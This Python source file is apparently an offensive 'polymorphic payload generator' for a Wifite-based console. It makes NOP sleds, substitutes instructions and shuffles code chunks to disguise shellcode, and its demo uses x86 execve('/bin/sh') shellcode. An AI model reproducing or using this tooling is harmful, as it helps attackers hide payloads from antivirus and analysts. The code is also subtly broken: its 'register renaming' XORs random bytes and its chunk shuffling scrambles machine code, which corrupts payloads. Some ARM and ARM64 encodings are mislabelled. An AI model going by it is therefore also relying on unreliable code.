#!/usr/bin/env python3
"""
Polymorphic Payload Generator Utility for Wifite Agentic Console
Provides functionality to generate variable-length NOP sleds, perform instruction 
substitution, register renaming, and code rearrangement for payload obfuscation.
"""

import random
import string
import struct
from typing import List, Dict, Tuple, Optional, Union
from enum import Enum


class Architecture(Enum):
    X86 = "x86"
    X64 = "x64"
    ARM = "arm"
    ARM64 = "arm64"


class PolymorphicPayloadGenerator:
    """
    A utility for generating polymorphic payloads with various obfuscation techniques.
    """
    
    def __init__(self, architecture: Architecture = Architecture.X86):
        self.architecture = architecture
        self.nop_sleds = {
            Architecture.X86: [
                b"\x90",           # NOP
                b"\x66\x90",       # NOP (2-byte)
                b"\x0f\x1f\x00",   # NOP (3-byte)
                b"\x0f\x1f\x40\x00", # NOP (4-byte)
                b"\x0f\x1f\x44\x00\x00", # NOP (5-byte)
                b"\x66\x0f\x1f\x44\x00\x00", # NOP (6-byte)
            ],
            Architecture.X64: [
                b"\x90",           # NOP
                b"\x66\x90",       # NOP (2-byte)
                b"\x0f\x1f\x00",   # NOP (3-byte)
                b"\x0f\x1f\x40\x00", # NOP (4-byte)
                b"\x0f\x1f\x44\x00\x00", # NOP (5-byte)
                b"\x66\x0f\x1f\x44\x00\x00", # NOP (6-byte)
                b"\x0f\x1f\x80\x00\x00\x00\x00", # NOP (7-byte)
                b"\x0f\x1f\x84\x00\x00\x00\x00\x00", # NOP (8-byte)
            ],
            Architecture.ARM: [
                b"\x00\x00\xa0\xe3", # MOV r0, r0
                b"\x00\x00\xa0\xe1", # MOV r0, r0
                b"\x00\x00\x00\x00", # AND r0, r0, r0
                b"\x00\x00\xa0\xe3", # MOV r0, #0
            ],
            Architecture.ARM64: [
                b"\x1f\x20\x03\xd5", # NOP
                b"\x1f\x20\x03\xd5", # NOP (alternative)
                b"\xaa\x00\x00\x00", # MOV x0, x0
                b"\xaa\x01\x00\x00", # MOV x0, x1
            ]
        }
        
        # Instruction substitution mappings
        self.instruction_substitutions = {
            Architecture.X86: {
                # mov eax, 0 -> xor eax, eax
                b"\xb8\x00\x00\x00\x00": [b"\x31\xc0"],
                # mov ebx, 0 -> xor ebx, ebx
                b"\xbb\x00\x00\x00\x00": [b"\x31\xdb"],
                # mov ecx, 0 -> xor ecx, ecx
                b"\xb9\x00\x00\x00\x00": [b"\x31\xc9"],
                # mov edx, 0 -> xor edx, edx
                b"\xba\x00\x00\x00\x00": [b"\x31\xd2"],
                # inc eax -> add eax, 1
                b"\x40": [b"\x83\xc0\x01"],
                # dec eax -> sub eax, 1
                b"\x48": [b"\x83\xe8\x01"],
                # add eax, 0 -> nop (equivalent)
                b"\x83\xc0\x00": [b"\x90"],
                # sub eax, 0 -> nop (equivalent)
                b"\x83\xe8\x00": [b"\x90"],
            },
            Architecture.X64: {
                # mov rax, 0 -> xor rax, rax
                b"\x48\xc7\xc0\x00\x00\x00\x00": [b"\x48\x31\xc0"],
                # mov rbx, 0 -> xor rbx, rbx
                b"\x48\xc7\xc3\x00\x00\x00\x00": [b"\x48\x31\xdb"],
                # mov rcx, 0 -> xor rcx, rcx
                b"\x48\xc7\xc1\x00\x00\x00\x00": [b"\x48\x31\xc9"],
                # mov rdx, 0 -> xor rdx, rdx
                b"\x48\xc7\xc2\x00\x00\x00\x00": [b"\x48\x31\xd2"],
                # inc rax -> add rax, 1
                b"\x48\x83\xc0\x01": [b"\x48\x83\xc0\x01"],  # Already optimal
                # dec rax -> sub rax, 1
                b"\x48\x83\xc0\xff": [b"\x48\x83\xe8\x01"],
            }
        }
        
        # Register renaming mappings (for x86/x64)
        self.register_mappings = {
            Architecture.X86: {
                'eax': ['eax', 'ecx', 'edx', 'ebx'],
                'ebx': ['eax', 'ecx', 'edx', 'ebx'],
                'ecx': ['eax', 'ecx', 'edx', 'ebx'],
                'edx': ['eax', 'ecx', 'edx', 'ebx'],
                'esi': ['esi', 'edi'],
                'edi': ['esi', 'edi'],
            },
            Architecture.X64: {
                'rax': ['rax', 'rcx', 'rdx', 'rbx', 'rsi', 'rdi', 'r8', 'r9'],
                'rbx': ['rax', 'rcx', 'rdx', 'rbx', 'rsi', 'rdi', 'r8', 'r9'],
                'rcx': ['rax', 'rcx', 'rdx', 'rbx', 'rsi', 'rdi', 'r8', 'r9'],
                'rdx': ['rax', 'rcx', 'rdx', 'rbx', 'rsi', 'rdi', 'r8', 'r9'],
                'rsi': ['rax', 'rcx', 'rdx', 'rbx', 'rsi', 'rdi', 'r8', 'r9'],
                'rdi': ['rax', 'rcx', 'rdx', 'rbx', 'rsi', 'rdi', 'r8', 'r9'],
                'r8': ['rax', 'rcx', 'rdx', 'rbx', 'rsi', 'rdi', 'r8', 'r9'],
                'r9': ['rax', 'rcx', 'rdx', 'rbx', 'rsi', 'rdi', 'r8', 'r9'],
            }
        }
    
    def generate_nop_sled(self, length: int, architecture: Optional[Architecture] = None) -> bytes:
        """
        Generate a variable-length NOP sled.
        
        Args:
            length: Desired length of the NOP sled in bytes
            architecture: Target architecture (uses instance architecture if None)
            
        Returns:
            Bytes containing the NOP sled
        """
        if architecture is None:
            architecture = self.architecture
            
        if architecture not in self.nop_sleds:
            # Fallback to single byte NOP
            return b"\x90" * length
        
        nop_instructions = self.nop_sleds[architecture]
        nop_sled = b""
        remaining_length = length
        
        # Generate NOP sled using variable-length NOP instructions
        while remaining_length > 0:
            # Choose a random NOP instruction
            nop_inst = random.choice(nop_instructions)
            inst_length = len(nop_inst)
            
            # If the instruction fits, use it
            if inst_length <= remaining_length:
                nop_sled += nop_inst
                remaining_length -= inst_length
            else:
                # If it doesn't fit, use smaller NOPs or fill with single byte NOPs
                if remaining_length >= 1:
                    nop_sled += b"\x90" * remaining_length
                    remaining_length = 0
                else:
                    break
                    
        # Ensure exact length by truncating or padding
        if len(nop_sled) > length:
            nop_sled = nop_sled[:length]
        elif len(nop_sled) < length:
            nop_sled += b"\x90" * (length - len(nop_sled))
            
        return nop_sled
    
    def substitute_instructions(self, payload: bytes, architecture: Optional[Architecture] = None) -> bytes:
        """
        Perform instruction substitution on the payload.
        
        Args:
            payload: Original payload bytes
            architecture: Target architecture (uses instance architecture if None)
            
        Returns:
            Bytes with substituted instructions
        """
        if architecture is None:
            architecture = self.architecture
            
        if architecture not in self.instruction_substitutions:
            return payload
            
        substitutions = self.instruction_substitutions[architecture]
        result = payload
        
        # Apply substitutions randomly
        for original, substitutes in substitutions.items():
            if original in result and random.random() < 0.3:  # 30% chance to substitute
                substitute = random.choice(substitutes)
                result = result.replace(original, substitute, 1)  # Replace only first occurrence
                
        return result
    
    def rename_registers(self, payload: bytes, architecture: Optional[Architecture] = None) -> bytes:
        """
        Perform register renaming on the payload.
        Note: This is a simplified implementation. Real register renaming would require
        proper disassembly and reassembly.
        
        Args:
            payload: Original payload bytes
            architecture: Target architecture (uses instance architecture if None)
            
        Returns:
            Bytes with renamed registers (simplified)
        """
        # For demonstration purposes, we'll apply some basic byte-level transformations
        # that simulate register renaming effects
        if architecture is None:
            architecture = self.architecture
            
        # Simple obfuscation techniques that mimic register renaming effects
        obfuscated = bytearray(payload)
        
        # Apply some random transformations to confuse analysis
        for i in range(len(obfuscated)):
            if random.random() < 0.1:  # 10% chance to modify each byte
                # Simple XOR with a random byte
                obfuscated[i] ^= random.randint(1, 255)
                
        return bytes(obfuscated)
    
    def rearrange_code(self, payload: bytes, chunk_size: int = 8) -> bytes:
        """
        Rearrange code chunks in the payload.
        
        Args:
            payload: Original payload bytes
            chunk_size: Size of chunks to rearrange (default: 8 bytes)
            
        Returns:
            Bytes with rearranged code chunks
        """
        if len(payload) <= chunk_size:
            return payload
            
        # Split payload into chunks
        chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
        
        # Shuffle chunks (except keep first and last for stability in some cases)
        if len(chunks) > 2:
            middle_chunks = chunks[1:-1]
            random.shuffle(middle_chunks)
            chunks = [chunks[0]] + middle_chunks + [chunks[-1]]
        elif len(chunks) == 2:
            # 50% chance to swap two chunks
            if random.random() < 0.5:
                chunks = [chunks[1], chunks[0]]
                
        # Rejoin chunks
        rearranged = b"".join(chunks)
        return rearranged
    
    def generate_polymorphic_payload(self, 
                                   base_payload: bytes,
                                   nop_sled_length: int = 0,
                                   architecture: Optional[Architecture] = None,
                                   apply_substitution: bool = True,
                                   apply_register_renaming: bool = True,
                                   apply_rearrangement: bool = True,
                                   rearrangement_chunk_size: int = 8) -> Dict[str, bytes]:
        """
        Generate a polymorphic payload using all available techniques.
        
        Args:
            base_payload: The original payload to obfuscate
            nop_sled_length: Length of NOP sled to prepend (0 for none)
            architecture: Target architecture (uses instance architecture if None)
            apply_substitution: Whether to apply instruction substitution
            apply_register_renaming: Whether to apply register renaming
            apply_rearrangement: Whether to apply code rearrangement
            rearrangement_chunk_size: Size of chunks for rearrangement
            
        Returns:
            Dictionary containing:
                - 'payload': The final polymorphic payload
                - 'nop_sled': The generated NOP sled (if any)
                - 'obfuscated_payload': The payload after obfuscation techniques
        """
        if architecture is None:
            architecture = self.architecture
            
        result = {
            'original_payload': base_payload,
            'nop_sled': b"",
            'obfuscated_payload': base_payload,
            'payload': base_payload
        }
        
        # Generate NOP sled if requested
        if nop_sled_length > 0:
            nop_sled = self.generate_nop_sled(nop_sled_length, architecture)
            result['nop_sled'] = nop_sled
            
        # Start with the base payload
        current_payload = base_payload
        
        # Apply instruction substitution
        if apply_substitution:
            current_payload = self.substitute_instructions(current_payload, architecture)
            
        # Apply register renaming
        if apply_register_renaming:
            current_payload = self.rename_registers(current_payload, architecture)
            
        # Apply code rearrangement
        if apply_rearrangement:
            current_payload = self.rearrange_code(current_payload, rearrangement_chunk_size)
            
        result['obfuscated_payload'] = current_payload
        
        # Prepend NOP sled if generated
        if nop_sled_length > 0:
            final_payload = result['nop_sled'] + result['obfuscated_payload']
        else:
            final_payload = result['obfuscated_payload']
            
        result['payload'] = final_payload
        
        return result


# Convenience functions for easy usage
def generate_nop_sled(length: int, architecture: Architecture = Architecture.X86) -> bytes:
    """Generate a variable-length NOP sled."""
    generator = PolymorphicPayloadGenerator(architecture)
    return generator.generate_nop_sled(length, architecture)


def generate_polymorphic_payload(base_payload: bytes, 
                               nop_sled_length: int = 0,
                               architecture: Architecture = Architecture.X86,
                               **kwargs) -> Dict[str, bytes]:
    """Generate a polymorphic payload with default settings."""
    generator = PolymorphicPayloadGenerator(architecture)
    return generator.generate_polymorphic_payload(
        base_payload, 
        nop_sled_length=nop_sled_length,
        architecture=architecture,
        **kwargs
    )


if __name__ == "__main__":
    # Example usage
    generator = PolymorphicPayloadGenerator(Architecture.X86)
    
    # Example payload (simple shellcode-like bytes)
    example_payload = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    
    print("Original payload:", example_payload.hex())
    
    # Generate NOP sled
    nop_sled = generator.generate_nop_sled(20)
    print("NOP sled:", nop_sled.hex())
    
    # Generate polymorphic payload
    result = generator.generate_polymorphic_payload(
        example_payload,
        nop_sled_length=16,
        apply_substitution=True,
        apply_register_renaming=True,
        apply_rearrangement=True
    )
    
    print("NOP sled:", result['nop_sled'].hex())
    print("Obfuscated payload:", result['obfuscated_payload'].hex())
    print("Final payload:", result['payload'].hex())